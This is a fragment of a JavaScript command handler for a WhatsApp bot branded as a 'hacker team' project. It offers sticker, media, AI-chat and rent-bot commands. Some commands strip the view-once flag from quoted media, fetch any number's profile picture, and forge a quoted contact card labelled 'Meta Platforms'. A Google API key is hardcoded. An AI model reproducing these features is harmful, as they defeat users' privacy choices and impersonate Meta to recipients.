				if (!args[0] && !args[1]) return m.reply(`𝙷𝙸 👋🏻 𝙸'𝙼 𝙰𝚅𝙸 🥷🏻 𝙷4𝙲𝙺3𝚁 𝚃𝙴𝙰𝙼 𝙼𝙴𝙼𝙱𝙴𝚁 🗡️* \n \n Runtime is ${runtime(process.uptime())}* `)
			}
				break
				
				
				
				
			case 'ping': case 'botstatus': case 'statusbot': {
				const used = process.memoryUsage()
				const cpus = os.cpus().map(cpu => {
					cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
					return cpu
				})
				const cpu = cpus.reduce((last, cpu, _, { length }) => {
					last.total += cpu.total
					last.speed += cpu.speed / length
					last.times.user += cpu.times.user
					last.times.nice += cpu.times.nice
					last.times.sys += cpu.times.sys
					last.times.idle += cpu.times.idle
					last.times.irq += cpu.times.irq
					return last
				}, {
					speed: 0,
					total: 0,
					times: {
						user: 0,
						nice: 0,
						sys: 0,
						idle: 0,
						irq: 0
					}
				})
				let timestamp = speed()
				let latensi = speed() - timestamp
				neww = performance.now()
				oldd = performance.now()
				respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}\n\n💻 Info Server\nRAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}\n\n_NodeJS Memory Usaage_\n${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v => v.length)), ' ')}: ${formatp(used[key])}`).join('\n')}\n\n${cpus[0] ? `_Total CPU Usage_\n${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n_CPU Core(s) Usage (${cpus.length} Core CPU)_\n${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}`.trim()
				m.reply(respon)
			}
				break



            case 'getdp':
            case 'getpp': {
                try {
                    let q = text.trim();
                    if (!q) return await Avi.sendMessage(m.chat, { text: "*❌ අංකයක් ලබා දෙන්න. Ex: .getdp 947xxxxxxxx*" });

                    let jid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    let ppUrl;
                    try {
                        ppUrl = await Avishka.profilePictureUrl(jid, "image");
                    } catch {
                        ppUrl = "https://files.catbox.moe/mjem6q.jpg"; 
                    }
                    
const metaQuote = {
            key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_GETDP" },
            message: { contactMessage: { displayName: "Avi", vcard: `BEGIN:VCARD\nVERSION:3.0\nN:Avi;;;;\nFN:Avi\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
        };
                    await Avishka.sendMessage(m.chat, { 
                        image: { url: ppUrl }, 
                        caption: `> 🖼 *Profile Picture of* +${q.replace(/[^0-9]/g, '')}\n> *Fetched by:* © 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢 ✨`,
                    }, { quoted: metaQuote });

                } catch (e) {
                    await Avishka.sendMessage(m.chat, { text: "*⚠️ DP එක ලබා ගත නොහැක.*" });
                }
                break;
            }


			case 'love': {
				m.reply('*love*');
				let profile
				try {
					profile = 'https://files.catbox.moe/jggkxf.jpg';
					//profile = 'https://files.catbox.moe/jggkxf.jpg';
				} catch (e) {
					profile = 'https://files.catbox.moe/jggkxf.jpg';
				}

			}
const metaQuote = {
            key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_GETDP" },
            message: { contactMessage: { displayName: "Avi", vcard: `BEGIN:VCARD\nVERSION:3.0\nN:Avi;;;;\nFN:Avi\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
        };
				Avishka.sendMessage(m.chat, {
					audio: { url: 'https://files.catbox.moe/7osbpj.mp3' },
					mimetype: 'audio/mp4',
					ptt: true
				}, { quoted:metaQuote });
				break




case 'ch' : {
m.reply(`Follow the 𝙰𝚅𝙸 𝙷𝙰𝙲𝙺𝙴𝚁'𝚂 💎 channel on WhatsApp: https://whatsapp.com/channel/0029VaqPVqA1yT2CTlHi0o13`);
}
break

/*
case 'ummmmmmmmmmma' : {
m.reply("*ummmmmmmmmmmmmma*");
}
break


case 'adare' : {
m.reply("*math adare*");
}
break


case 'sudu' : {
m.reply("*o mnika*");
}
break

case 'mokkd' : {
m.reply("*mkn*");
}
break

case 'alist' : {
m.reply(`${allmenu} \n menu`);
}
break


case 'mmm' : {
m.reply("*hmm*");
}
break

case 'bye' : {
m.reply("*ynoda *");
}
break



case 'sorry': case 'samawenna' : {
    for (let i = 0; i < 10; i++) {
        await Avishka.sendMessage(m.chat, { text: '*මට සමාවෙන්න රත්තරන් මන් වැරදි ඔයා නෙවේ* 😔' }, { quoted: m });
    }
}
break;

*/

			case 'afk': {
				let user = db.users[m.sender]
				user.afkTime = + new Date
				user.afkReason = text
				m.reply(`@${m.sender.split('@')[0]} Telah Afk${text ? ': ' + text : ''}`)
			}
				break
			case '👍': case 'viewone': case '1more': {
				if (!m.quoted) return m.reply(`Reply view once message\nExample: ${prefix + command}`)
				try {
					if (m.quoted.msg.viewOnce) {
						delete m.quoted.chat
						m.quoted.msg.viewOnce = false
							await m.reply( { forward: m.quoted })
					} else m.reply(`Reply view once message\nExample: ${prefix + command}`)
				} catch (e) {
					m.reply('Media Invalid!')
				}
			}
			
			
			
			
			
				break
			case 'inspect': {
				if (!text) return m.reply('Masukkan Link Grup atau Saluran!')
				let _grup = /chat.whatsapp.com\/([\w\d]*)/;
				let _saluran = /whatsapp\.com\/channel\/([\w\d]*)/;
				if (_grup.test(text)) {
					await Avishka.groupGetInviteInfo(text.match(_grup)[1]).then((_g) => {
						let teks = `*[ INFORMATION GROUP ]*\n\nName Group: ${_g.subject}\nGroup ID: ${_g.id}\nCreate At: ${new Date(_g.creation * 1000).toLocaleString()}${_g.owner ? ('\nCreate By: ' + _g.owner) : ''}\nLinked Parent: ${_g.linkedParent}\nRestrict: ${_g.restrict}\nAnnounce: ${_g.announce}\nIs Community: ${_g.isCommunity}\nCommunity Announce:${_g.isCommunityAnnounce}\nJoin Approval: ${_g.joinApprovalMode}\nMember Add Mode: ${_g.memberAddMode}\nDescription ID: ${'`' + _g.descId + '`'}\nDescription: ${_g.desc}\nParticipants:\n`
						_g.participants.forEach((a) => {
							teks += a.admin ? `- Admin: @${a.id.split('@')[0]} [${a.admin}]\n` : ''
						})
						m.reply(teks)
					}).catch((e) => {
						if ([400, 406].includes(e.data)) return m.reply('Grup Tidak Di Temukan❗');
						if (e.data == 401) return m.reply('Bot Di Kick Dari Grup Tersebut❗');
						if (e.data == 410) return m.reply('Url Grup Telah Di Setel Ulang❗');
					});
				} else if (_saluran.test(text) || text.endsWith('@newsletter') || !isNaN(text)) {
					await Avishka.newsletterMsg(text.match(_saluran)[1]).then((n) => {
						m.reply(`*[ INFORMATION CHANNEL ]*\n\nID: ${n.id}\nState: ${n.state.type}\nName: ${n.thread_metadata.name.text}\nCreate At: ${new Date(n.thread_metadata.creation_time * 1000).toLocaleString()}\nSubscriber: ${n.thread_metadata.subscribers_count}\nVerification: ${n.thread_metadata.verification}\nDescription: ${n.thread_metadata.description.text}\n`)
					}).catch((e) => m.reply('Saluran Tidak Di Temukan❗'))
				} else m.reply('Hanya Support Url Grup atau Saluran!')
			}
				break
			case 'addmsg': {
				if (!m.quoted) return m.reply('Reply Pesan Yang Ingin Disave Di Database')
				if (!text) return m.reply(`Example : ${prefix + command} file name`)
				let msgs = db.database
				if (text.toLowerCase() in msgs) return m.reply(`'${text}' telah terdaftar di list pesan`)
				msgs[text.toLowerCase()] = m.quoted
				delete msgs[text.toLowerCase()].chat
				m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'\nAkses dengan ${prefix}getmsg ${text}\nLihat list Pesan Dengan ${prefix}listmsg`)
			}
				break
			// case 'delmsg': case 'deletemsg': {
			// 	if (!text) return m.reply('Nama msg yg mau di delete?')
			// 	let msgs = db.database
			// 	if (text == 'allmsg') {
			// 		db.database = {}
			// 		m.reply('Berhasil menghapus seluruh msg dari list pesan')
			// 	} else {
			// 		if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
			// 		delete msgs[text.toLowerCase()]
			// 		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
			// 	}
			// }
			// break
			// case 'getmsg': {
			// 	if (!text) return m.reply(`Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`)
			// 	let msgs = db.database
			// 	if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar di list pesan`)
			// 	await Avishka.relayMessage(m.chat, msgs[text.toLowerCase()], {})
			// }
			// break
			// case 'listmsg': {
			// 	let seplit = Object.entries(db.database).map(([nama, isi]) => { return { nama, message: getContentType(isi) }})
			// 	let teks = '「 LIST DATABASE 」\n\n'
			// 	for (let i of seplit) {
			// 		teks += `${setv} *Name :* ${i.nama}\n${setv} *Type :* ${i.message?.replace(/Message/i, '')}\n───────────────\n`
			// 	}
			// 	m.reply(teks)
			// }
			// break
			case 'q': case 'quoted': {
				if (!m.quoted) return m.reply('Reply Pesannya!')
				if (text) {
					delete m.quoted.chat
					await m.reply({ forward: m.quoted })
				} else {
					const anu = await m.getQuotedObj()
					if (!anu) return m.reply('Format Tidak Tersedia!')
					if (!anu.quoted) return m.reply('Pesan Yang Anda Reply Tidak Mengandung Reply')
					await Avishka.relayMessage(m.chat, { [anu.quoted.type]: anu.quoted.msg }, {})
				}
			}
				break
			case 'confes': case 'confess': case 'menfes': case 'menfess': {
				if (!isLimit) return m.reply(mess.limit)
				if (m.isGroup) return m.reply(mess.private)
				if (menfes[m.sender]) return m.reply(`Kamu Sedang Berada Di Sesi ${command}!`)
				if (!text) return m.reply(`Example : ${prefix + command} 94xxxx|Nama Samaran`)
				let [teks1, teks2] = text.split`|`
				if (teks1) {
					const tujuan = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					const onWa = await Avishka.onWhatsApp(tujuan)
					if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
					menfes[m.sender] = {
						tujuan: tujuan,
						nama: teks2 ? teks2 : 'Orang'
					};
					menfes[tujuan] = {
						tujuan: m.sender,
						nama: 'Penerima',
					};
					const timeout = setTimeout(() => {
						if (menfes[m.sender]) {
							m.reply(`_Waktu ${command} habis_`);
							delete menfes[m.sender];
						}
						if (menfes[tujuan]) {
							Avishka.sendMessage(tujuan, { text: `_Waktu ${command} habis_` });
							delete menfes[tujuan];
						}
						menfesTimeouts.delete(m.sender);
						menfesTimeouts.delete(tujuan);
					}, 600000);
					menfesTimeouts.set(m.sender, timeout);
					menfesTimeouts.set(tujuan, timeout);
					Avishka.sendMessage(tujuan, { text: `_${command} connected_\n*Note :* jika ingin mengakhiri ketik _*${prefix}del${command}*_` });
					m.reply(`_Memulai ${command}..._\n*Silahkan Mulai kirim pesan/media*\n*Durasi ${command} hanya During 10 menit*\n*Note :* jika ingin mengakhiri ketik _*${prefix}del${command}*_`)
					setLimit(m, db)
				} else m.reply(`Masukkan Nomernya!\nExample : ${prefix + command} 94xxxx|Nama Samaran`)
			}
				break
			case 'delconfes': case 'delconfess': case 'delmenfes': case 'delmenfess': {
				if (!menfes[m.sender]) return m.reply(`Kamu Tidak Sedang Berada Di Sesi ${command.split('del')[1]}!`)
				let anu = menfes[m.sender]
				if (menfesTimeouts.has(m.sender)) {
					clearTimeout(menfesTimeouts.get(m.sender));
					menfesTimeouts.delete(m.sender);
				}
				if (menfesTimeouts.has(anu.tujuan)) {
					clearTimeout(menfesTimeouts.get(anu.tujuan));
					menfesTimeouts.delete(anu.tujuan);
				}
				Avishka.sendMessage(anu.tujuan, { text: `Chat Di Akhiri Oleh ${anu.nama ? anu.nama : 'Seseorang'}` })
				m.reply(`Success Mengakhiri Sesi ${command.split('del')[1]}!`)
				delete menfes[anu.tujuan];
				delete menfes[m.sender];
			}
				break
			case 'cai': case 'roomai': case 'chatai': case 'autoai': {
				if (m.isGroup) return m.reply(mess.private)
				if (chat_ai[m.sender]) return m.reply(`Kamu Sedang Berada Di Sesi ${command}!`)
				if (!text) return m.reply(`Example: ${prefix + command} halo ngab\nWith Prompt: ${prefix + command} halo ngab|Kamu adalah assisten yang siap membantu dalam hal apapun yang ku minta.\n\nUntuk Menghapus room: ${prefix + 'del' + command}`)
				let [teks1, teks2] = text.split`|`
				chat_ai[m.sender] = [{ role: 'system', content: teks2 || '' }, { role: 'user', content: text.split`|` ? teks1 : text || '' }]
				let hasil;
				try {
					hasil = await gptLogic(chat_ai[m.sender], budy)
				} catch (e) {
					hasil = await yanzGpt(chat_ai[m.sender])
				}
				const response = hasil?.choices?.[0]?.message?.content || hasil || 'Maaf, saya tidak mengerti.';
				chat_ai[m.sender].push({ role: 'assistant', content: response });
				await m.reply(response)
			}
				break
			case 'delcai': case 'delroomai': case 'delchatai': case 'delautoai': {
				if (!chat_ai[m.sender]) return m.reply(`Kamu Tidak Sedang Berada Di Sesi ${command.split('del')[1]}!`)
				m.reply(`Success Mengakhiri Sesi ${command.split('del')[1]}!`)
				delete chat_ai[m.sender];
			}
				break
			case 'rentbot': {
				//if (!isPremium) return m.reply(mess.prem)
				if (!isLimit) return m.reply(mess.limit)
				const nmrnya = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.sender
				const onWa = await Avishka.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return m.reply('This Number is not Registered on whatsapp!')
				await RentBot(Avishka, nmrnya, m, store)
				m.reply(`use ${prefix}stop rent bot\n`)
				setLimit(m, db)
			}
				break
			case 'stoprentbot': case 'delrentbot': {
				const nmrnya = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.sender
				const onWa = await Avishka.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return m.reply('stop rent Whatsapp Bot contact Avi!')
				await StopRentBot(Avishka, nmrnya, m)
			}
				break
			case 'listrentbot': {
				ListRentBot(Avishka, m)
			}
				break

			// Tools Menu
			case 'fetch': case 'get': {
				if (!isPremium) return m.reply(mess.prem)
				if (!isLimit) return m.reply(mess.limit)
				if (!/^https?:\/\//.test(text)) return m.reply('Awali dengan http:// atau https://');
				try {
					const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text)
					if (!/text|json|htm.chat|plain/.test(res.headers['content-type'])) {
						await m.reply(text)
					} else m.reply(util.format(res.data))
					setLimit(m, db)
				} catch (e) {
					m.reply(String(e))
				}
			}
				break
			case 'toaud': case 'toaudio': {
				if (!/video|audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
				m.reply(mess.wait)
				let media = await quoted.download()
				let audio = await toAudio(media, 'mp4')
				await m.reply({ audio: audio, mimetype: 'audio/mpeg' })
			}
				break
			case 'tomp3': {
				if (!/video|audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
				m.reply(mess.wait)
				let media = await quoted.download()
				let audio = await toAudio(media, 'mp4')
				await m.reply({ document: audio, mimetype: 'audio/mpeg', fileName: `Convert By Avishka Bot.mp3` })
			}
				break
			case 'tovn': case 'toptt': case 'tovoice': {
				if (!/video|audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
				m.reply(mess.wait)
				let media = await quoted.download()
				let audio = await toPTT(media, 'mp4')
				await m.reply({ audio: audio, mimetype: 'audio/ogg; codecs=opus',ptt: false })
			}
				break
			case 'togif': {
				if (!/webp|video/.test(mime)) return m.reply(`Reply Video/Stiker dengan caption *${prefix + command}*`)
				m.reply(mess.wait)
				let media = await Avishka.downloadAndSaveMediaMessage(qmsg)
				let ran = `./system/cashdata/${getRandom('.gif')}`;
				exec(`convert ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return m.reply('Gagal❗')
					let buffer = fs.readFileSync(ran)
					m.reply({ video: buffer, gifPlayback: true })
					fs.unlinkSync(ran)
				})
			}
				break
			case 'toimage': case 'toimg': {
				if (!/webp|video/.test(mime)) return m.reply(`Reply Video/Stiker dengan caption *${prefix + command}*`)
				m.reply(mess.wait)
				let media = await Avishka.downloadAndSaveMediaMessage(qmsg)
				let ran = `./system/cashdata/${getRandom('.png')}`;
				exec(`convert ${media}[0] ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return m.reply('Gagal❗')
					let buffer = fs.readFileSync(ran)
					m.reply({ image: buffer })
					fs.unlinkSync(ran)
				})
			}
				break
			case 'toptv': {
				if (!/video/.test(mime)) return m.reply(`Kirim/Reply Video Yang Ingin Dijadikan PTV Message Dengan Caption ${prefix + command}`)
				if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
					const anu = await quoted.download()
					const message = await generateWAMessageContent({ video: anu }, { upload: Avishka.waUploadToServer })
					await Avishka.relayMessage(m.chat, { ptvMessage: message.videoMessage }, {})
				} else m.reply('Reply Video Yang Mau Di Ubah Ke PTV Message!')
			}
				break
			case 'tourl': {
				try {
					if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
						m.reply(mess.wait)
						let media = await quoted.download()
						let anu = await ConMedia(media)
						m.reply('Url : ' + anu.url)
					} else m.reply('Send Media yg ingin di Upload!')
				} catch (e) {
					m.reply('Server Uploader sedang offline!')
				}
			}
				break
			case 'texttospech': case 'tts': case 'tospech': {
				if (!text) return m.reply('Mana text yg mau diubah menjadi audio?')
				let { tts } = require('./lib/tts')
				let anu = await tts(text)
				m.reply({ audio: anu,ptt: false, mimetype: 'audio/mpeg' })
			}
				break
			case 'translate': case 'tr': {
				if (text && text == 'list') {
					let list_tr = `╭──❍「 *Kode Bahasa* 」❍\n│• af : Afrikaans\n│• ar : Arab\n│• zh : Chinese\n│• en : English\n│• en-us : English (United States)\n│• fr : French\n│• de : German\n│• hi : Hindi\n│• hu : Hungarian\n│• is : Icelandic\n│• id : Indonesian\n│• it : Italian\n│• ja : Japanese\n│• ko : Korean\n│• la : Latin\n│• no : Norwegian\n│• pt : Portuguese\n│• pt : Portuguese\n│• pt-br : Portuguese (Brazil)\n│• ro : Romanian\n│• ru : Russian\n│• sr : Serbian\n│• es : Spanish\n│• sv : Swedish\n│• ta : Tamil\n│• th : Thai\n│• tr : Turkish\n│• vi : Vietnamese\n╰──────❍`;
					m.reply(list_tr)
				} else {
					if (!m.quoted && (!text || !args[1])) return m.reply(`Kirim/reply text dengan caption ${prefix + command}`)
					let lang = args[0] ? args[0] : 'id'
					let teks = args[1] ? args.slice(1).join(' ') : m.quoted.text
					try {
						let hasil = await translate(teks, { to: lang, autoCorrect: true })
						m.reply(`To : ${lang}\n${hasil[0]}`)
					} catch (e) {
						m.reply(`Lang *${lang}* Tidak Di temukan!\nSilahkan lihat list, ${prefix + command} list`)
					}
				}
			}
				break
			case 'toqr': case 'qr': {
				if (!text) return m.reply(`Ubah Text ke Qr dengan *${prefix + command}* textnya`)
				m.reply(mess.wait)
				await m.reply({ image: { url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + text }, caption: 'Done ! ' })
			}
				break
			case 'tohd': case 'remini': case 'hd': {
				if (!isLimit) return m.reply(mess.limit)
				if (/image/.test(mime)) {
					try {
						let media = await quoted.download()
						let hasil = await remini(media, 'enhance')
						m.reply({ image: hasil, caption: 'Done' })
						setLimit(m, db)
					} catch (e) {
						let media = await Avishka.downloadAndSaveMediaMessage(qmsg)
						let ran = `./system/cashdata/${getRandom('.jpg')}`;
						const scaleFactor = isNaN(parseInt(text)) ? 4 : parseInt(text) < 10 ? parseInt(text) : 4;
						exec(`ffmpeg -i "${media}" -vf "scale=iw*${scaleFactor}:ih*${scaleFactor}:flags=lanczos" -q:v 1 "${ran}"`, async (err, stderr, stdout) => {
							fs.unlinkSync(media)
							if (err) return m.reply(String(err))
							let buff = fs.readFileSync(ran)
							await Avishka.sendMedia(m.chat, buff, '', 'Done', m);
							fs.unlinkSync(ran)
							setLimit(m, db)
						});
					}
				} else m.reply(`Kirim/Reply Gambar dengan format\nExample: ${prefix + command}`)
			}
				break
			case 'dehaze': case 'colorize': case 'colorfull': {
				if (!isLimit) return m.reply(mess.limit)
				if (/image/.test(mime)) {
					let media = await quoted.download()
					remini(media, 'dehaze').then(a => {
						m.reply({ image: a, caption: 'Done' })
						setLimit(m, db)
					}).catch(e => m.reply('Server sedang offline!'));
				} else m.reply(`Kirim/Reply Gambar dengan format\nExample: ${prefix + command}`)
			}
				break




			case 'hitamkan': case 'toblack': {
				if (!isLimit) return m.reply(mess.limit)
				if (/image/.test(mime)) {
					let media = await quoted.download()
					hitamkan(media, 'hitam').then(a => {
						m.reply({ image: a, caption: 'Done' })
						setLimit(m, db)
					}).catch(e => m.reply('Server sedang offline!'));
				} else m.reply(`Kirim/Reply Gambar dengan format\nExample: ${prefix + command}`)
			}
				break
			case 'ssweb': {
				if (!isPremium) return m.reply(mess.prem)
				if (!text) return m.reply(`Example: ${prefix + command} https://github.com/avishka33`)
				try {
					let anu = 'https://' + text.replace(/^https?:\/\//, '')
					await m.reply({ image: { url: 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + anu }, caption: 'Done' })
					setLimit(m, db)
				} catch (e) {
					m.reply('Server SS web Sedang Offline!')
				}
			}
				break
			case 'readmore': {
				let teks1 = text.split`|`[0] ? text.split`|`[0] : ''
				let teks2 = text.split`|`[1] ? text.split`|`[1] : ''
				m.reply(teks1 + readmore + teks2)
			}
				break
			case 'getexif': {
				if (!m.quoted) return m.reply(`Reply sticker\nDengan caption ${prefix + command}`)
				if (!/sticker|webp/.test(quoted.type)) return m.reply(`Reply sticker\nDengan caption ${prefix + command}`)
				const img = new webp.Image()
				await img.load(await m.quoted.download())
				m.reply(util.format(JSON.parse(img.exif.slice(22).toString())))
			}
				break

			case 'sticker': case 'stiker': case 's': case 'stickergif': case 'stikergif': case 'sgif': case 'stickerwm': case 'swm': case 'curi': case 'colong': case 'take': case 'stickergifwm': case 'sgifwm': {
				if (!/image|video|sticker/.test(quoted.type)) return m.reply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Image/Video/Gif 1-9 Detik`)
				let media = await quoted.download()
				let teks1 = text.split`|`[0] ? text.split`|`[0] : ''
				let teks2 = text.split`|`[1] ? text.split`|`[1] : ''
				if (/image|webp/.test(mime)) {
					m.reply(mess.wait)
					await Avishka.sendAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
				} else if (/video/.test(mime)) {
					if ((qmsg).seconds > 11) return m.reply('Maksimal 10 detik!')
					m.reply(mess.wait)
					await Avishka.sendAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
				} else m.reply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`)
			}
				break
			case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
				try {
					//if (!isPremium) return m.reply(mess.prem)
					if (!isLimit) return m.reply(mess.limit)
					if (!/image|webp/.test(mime)) return m.reply(`Kirim/reply image/sticker\nDengan caption ${prefix + command} atas|bawah`)
					if (!text) return m.reply(`Kirim/reply image/sticker dengan caption ${prefix + command} atas|bawah`)
					m.reply(mess.wait)
					let atas = text.split`|`[0] ? text.split`|`[0] : '-'
					let bawah = text.split`|`[1] ? text.split`|`[1] : '-'
					let media = await quoted.download()
					let mem = await ConMedia(media)
					let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
					await Avishka.sendAsSticker(m.chat, smeme, m, { packname: packname, author: author })
					setLimit(m, db)
				} catch (e) {
					m.reply('Server Meme Sedang Offline!')
				}
			}
				break
			case 'emojimix': {
				//if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`භාවිතා කරන ක්‍රමය : \n ${prefix + command} 😅+🤔`)
				let [emoji1, emoji2] = text.split`+`
				if (!emoji1 && !emoji2) return m.reply(`Example: ${prefix + command} 😅+🤔`)
				try {
					let anu = await axios.get(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
					if (anu.data.results.length < 1) return m.reply(` ❌ සමාවෙන්න, \n මේ ${text} ඉමෝජි දෙක මිශ්‍ර කරන්න බැහැ. වෙනත් ඉමෝජි දෙකක් උත්සාහ කරන්න.!`)
					for (let res of anu.data.results) {
						await Avishka.sendAsSticker(m.chat, res.url, m, { packname: packname, author: author })
					}
					setLimit(m, db)
				} catch (e) {
					m.reply('❌ සර්වර් එකේ දෝෂයක් සිදු වුණා. පසුව උත්සාහ කරන්න.!')
				}
			}
				break
				
				


				
				
			case 'qc': case 'quote': case 'fakechat': {
				//if (!isLimit) return m.reply(mess.limit)
				if (!text && !m.quoted) return m.reply(`Kirim/reply pesan *${prefix + command}* Teksnya`)
				try {
					let ppnya = await Avishka.profilePictureUrl(m.sender, 'image').catch(() => 'https://i.pinimg.com/564x/8a/e9/e9/8ae9e92fa4e69967aa61bf2bda967b7b.jpg');
					let res = await quotedLyo(text, m.pushName, ppnya);
					await Avishka.sendAsSticker(m.chat, Buffer.from(res.result.image, 'base64'), m, { packname: packname, author: author })
					setLimit(m, db)
				} catch (e) {
					m.reply('Server Create Sedang Offline!')
				}
			}
				break
			case 'brat': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text && (!m.quoted || !m.quoted.text)) return m.reply(`Kirim/reply pesan *${prefix + command}* Teksnya`)
				try {
					await Avishka.sendAsSticker(m.chat, 'https://brat.caliphdev.com/api/brat?text=' + encodeURIComponent(text || m.quoted.text), m)
					setLimit(m, db)
				} catch (e) {
					try {
						await Avishka.sendAsSticker(m.chat, 'https://aqul-brat.hf.space/?text=' + encodeURIComponent(text || m.quoted.text), m)
						setLimit(m, db)
					} catch (e) {
						m.reply('Server Brat Sedang Offline!')
					}
				}
			}
				break
			case 'bratvid': case 'bratvideo': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text && (!m.quoted || !m.quoted.text)) return m.reply(`Kirim/reply pesan *${prefix + command}* Teksnya`)
				const teks = (m.quoted ? m.quoted.text : text).split(' ');
				const tempDir = path.join(process.cwd(), 'system/cashdata');
				try {
					const framePaths = [];
					for (let i = 0; i < teks.length; i++) {
						const currentText = teks.slice(0, i + 1).join(' ');
						let res
						try {
							res = await getBuffer('https://brat.caliphdev.com/api/brat?text=' + encodeURIComponent(currentText));
						} catch (e) {
							res = await getBuffer('https://aqul-brat.hf.space/?text=' + encodeURIComponent(currentText));
						}
						const framePath = path.join(tempDir, `${m.sender + i}.mp4`);
						fs.writeFileSync(framePath, res);
						framePaths.push(framePath);
					}
					const fileListPath = path.join(tempDir, `${m.sender}.txt`);
					let fileListContent = '';
					for (let i = 0; i < framePaths.length; i++) {
						fileListContent += `file '${framePaths[i]}'\n`;
						fileListContent += `duration 0.5\n`;
					}
					fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`;
					fileListContent += `duration 3\n`;
					fs.writeFileSync(fileListPath, fileListContent);
					const outputVideoPath = path.join(tempDir, `${m.sender}-output.mp4`);
					execSync(`ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf 'fps=30' -c:v libx264 -preset veryfast -pix_fmt yuv420p -t 00:00:10 ${outputVideoPath}`);
					Avishka.sendAsSticker(m.chat, outputVideoPath, m, { packname: packname, author: author })
					framePaths.forEach((filePath) => fs.unlinkSync(filePath));
					fs.unlinkSync(fileListPath);
					fs.unlinkSync(outputVideoPath);
					setLimit(m, db)
				} catch (e) {
					m.reply('Terjadi Kesalahan Saat Memproses Permintaan!')
				}
			}
				break
			case 'wasted': {
				if (!isLimit) return m.reply(mess.limit)
				try {
					if (/jpg|jpeg|png/.test(mime)) {
						m.reply(mess.wait)
						let media = await quoted.download()
						let anu = await ConMedia(media)
						await Avishka.sendFileUrl(m.chat, 'https://some-random-api.com/canvas/wasted?avatar=' + anu.url, 'Done ! ', m)
						setLimit(m, db)
					} else m.reply('Send Media yg ingin di Upload!')
				} catch (e) {
					m.reply('Server Canvas Sedang Offline!')
				}
			}
				break
			case 'trigger': case 'triggered': {
				if (!isLimit) return m.reply(mess.limit)
				try {
					if (/jpg|jpeg|png/.test(mime)) {
						m.reply(mess.wait)
						let media = await quoted.download()
						let anu = await ConMedia(media)
						await m.reply({ document: { url: 'https://some-random-api.com/canvas/triggered?avatar=' + anu.url }, fileName: 'triggered.gif', mimetype: 'image/gif' })
						setLimit(m, db)
					} else m.reply('Send Media yg ingin di Upload!')
				} catch (e) {
					m.reply('Server Canvas Sedang Offline!')
				}
			}
				break
			case 'nulis': {
				m.reply(`*Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
			}
				break
			case 'nuliskiri': {
			//	if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`)
				m.reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
